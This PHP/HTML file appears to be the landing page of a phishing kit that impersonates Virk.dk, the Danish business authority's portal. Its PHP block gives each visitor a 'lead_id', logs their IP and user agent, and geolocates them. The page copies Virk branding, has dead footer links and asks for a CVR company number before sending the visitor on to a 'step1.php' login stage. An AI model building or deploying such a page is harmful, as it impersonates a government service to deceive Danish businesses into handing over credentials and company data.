<?php
require_once 'config.php';
session_start();

// Generate session ID for tracking
if (!isset($_SESSION['lead_id'])) {
    $_SESSION['lead_id'] = bin2hex(random_bytes(16));
}

// Collect device info
$device_info = [
    'ip' => $_SERVER['REMOTE_ADDR'] ?? 'Unknown',
    'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown',
    'device_type' => 'Desktop',
    'country' => 'Unknown',
    'timestamp' => date('Y-m-d H:i:s')
];

// Detect mobile
if (preg_match('/mobile|android|iphone|ipad/i', $device_info['user_agent'])) {
    $device_info['device_type'] = 'Mobile';
}

// Get geo info
$geo = @file_get_contents("http://ip-api.com/json/{$device_info['ip']}?fields=country,regionName,city");
if ($geo) {
    $geo_data = json_decode($geo, true);
    $device_info['country'] = $geo_data['country'] ?? 'Unknown';
    $device_info['city'] = $geo_data['city'] ?? 'Unknown';
    $device_info['region'] = $geo_data['regionName'] ?? 'Unknown';
}

$_SESSION['device_info'] = $device_info;
?>
<!DOCTYPE html>
<html lang="da">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Virk.dk - Erhvervsstyrelsens digitale indgang</title>
    <link rel="icon" type="image/svg+xml" href="assets/logo.svg">
    <link rel="stylesheet" href="assets/style.css">
</head>
<body>
    <!-- Top Navigation -->
    <header class="top-nav">
        <div class="nav-container">
            <div class="nav-left">
                <img src="assets/logo.svg" alt="Virk Logo" class="nav-logo">
                <span class="nav-brand">virk.dk</span>
            </div>
            <div class="nav-right">
                <span class="nav-item">Erhvervsstyrelsen</span>
                <span class="nav-separator">|</span>
                <span class="nav-item">Digital Post</span>
                <span class="nav-separator">|</span>
                <span class="nav-item">Support</span>
            </div>
        </div>
    </header>

    <!-- Main Content -->
    <main class="main-content">
        <!-- Hero Section -->
        <div class="hero-section">
            <div class="hero-text">
                <h1>Velkommen til Virk</h1>
                <p>Erhvervsstyrelsens digitale indgang til det offentlige</p>
            </div>
        </div>

        <!-- Search Section -->
        <div class="search-section">
            <div class="search-box">
                <div class="search-header">
                    <img src="assets/logo.svg" alt="Virk" class="search-logo">
                    <h2>Find din virksomhed</h2>
                    <p>Indtast dit CVR-nummer for at finde din virksomhed</p>
                </div>
                
                <form id="cvrSearchForm" class="search-form" onsubmit="return handleSearch(event)">
                    <div class="search-input-wrapper">
                        <svg class="search-icon" viewBox="0 0 24 24" width="20" height="20">
                            <path d="M21 21L16.65 16.65M19 11C19 15.4183 15.4183 19 11 19C6.58172 19 3 15.4183 3 11C3 6.58172 6.58172 3 11 3C15.4183 3 19 6.58172 19 11Z" 
                                  stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round"/>
                        </svg>
                        <input type="text" 
                               id="cvrNumber" 
                               name="cvr_number" 
                               placeholder="Indtast CVR-nummer (8 cifre)"
                               pattern="[0-9]{8}"
                               maxlength="8"
                               required>
                        <button type="submit" class="search-button">Søg</button>
                    </div>
                </form>

                <!-- Search Results -->
                <div id="searchResults" class="search-results" style="display: none;">
                    <div class="loading-spinner" id="loadingSpinner">
                        <div class="spinner"></div>
                        <p>Søger efter virksomhed...</p>
                    </div>
                    
                    <div id="companyResult" style="display: none;">
                        <div class="company-card">
                            <div class="company-header">
                                <h3 id="companyName"></h3>
                                <span class="company-status">Aktiv</span>
                            </div>
                            <div class="company-details">
                                <p><strong>CVR-nummer:</strong> <span id="resultCVR"></span></p>
                                <p><strong>Adresse:</strong> <span id="companyAddress"></span></p>
                                <p><strong>Status:</strong> <span class="status-active">● Aktiv virksomhed</span></p>
                            </div>
                            <button class="continue-button" onclick="proceedToLogin()">
                                Log ind på virksomheden →
                            </button>
                        </div>
                    </div>
                    
                    <div id="noResult" style="display: none;">
                        <p class="no-result-text">Ingen virksomhed fundet med dette CVR-nummer. Prøv igen.</p>
                    </div>
                </div>
            </div>
        </div>
    </main>

    <!-- Footer -->
    <footer class="site-footer">
        <div class="footer-container">
            <div class="footer-column">
                <h4>Om Virk</h4>
                <ul>
                    <li><a href="#" onclick="return false;">Hvad er Virk?</a></li>
                    <li><a href="#" onclick="return false;">Nyheder</a></li>
                    <li><a href="#" onclick="return false;">Kontakt</a></li>
                </ul>
            </div>
            <div class="footer-column">
                <h4>Hjælp og support</h4>
                <ul>
                    <li><a href="#" onclick="return false;">Supportcenter</a></li>
                    <li><a href="#" onclick="return false;">Ofte stillede spørgsmål</a></li>
                    <li><a href="#" onclick="return false;">Systemstatus</a></li>
                </ul>
            </div>
            <div class="footer-column">
                <h4>Juridisk</h4>
                <ul>
                    <li><a href="#" onclick="return false;">Privatlivspolitik</a></li>
                    <li><a href="#" onclick="return false;">Cookiepolitik</a></li>
                    <li><a href="#" onclick="return false;">Tilgængelighed</a></li>
                </ul>
            </div>
        </div>
        <div class="footer-bottom">
            <p>© <?php echo date('Y'); ?> Erhvervsstyrelsen. Alle rettigheder forbeholdes.</p>
        </div>
    </footer>

    <script src="assets/script.js"></script>
    <script>
        // Store CVR in session when found
        function proceedToLogin() {
            const cvr = document.getElementById('cvrNumber').value;
            const companyName = document.getElementById('companyName').textContent;
            
            // Store in session via AJAX
            fetch('store_session.php', {
                method: 'POST',
                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                body: 'cvr=' + cvr + '&company=' + encodeURIComponent(companyName)
            }).then(() => {
                window.location.href = 'step1.php';
            });
        }
    </script>
</body>
</html>
